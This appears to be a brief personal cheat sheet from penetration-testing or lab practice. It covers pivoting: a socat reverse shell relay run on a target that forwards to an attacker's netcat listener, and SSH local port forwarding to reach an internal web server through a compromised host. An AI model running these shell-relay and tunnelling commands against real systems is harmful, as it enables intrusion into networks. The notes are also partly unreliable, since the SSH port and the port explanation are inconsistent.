Socat
- Reverse Shell Relay
  - localhost
    - `nc -lvnp 443` this needs started first
  - target
    - `./socat tcp-l:8000 tcp:localip:443 &`
  - 8000 is the port we want the traffic to relay to and 443 is the port were connecting to
 
SSH
  -  If want to connect to a webpage that dont have access to but have access to another comp on its network
  - `ssh -L 800:10.10.10.10:80 user@10.10.10.5 -fN`
  - navigate to `localhost:8000`
    - Example assumes SSH access to 10.10.10.5 and webserver on 10.10.10.10
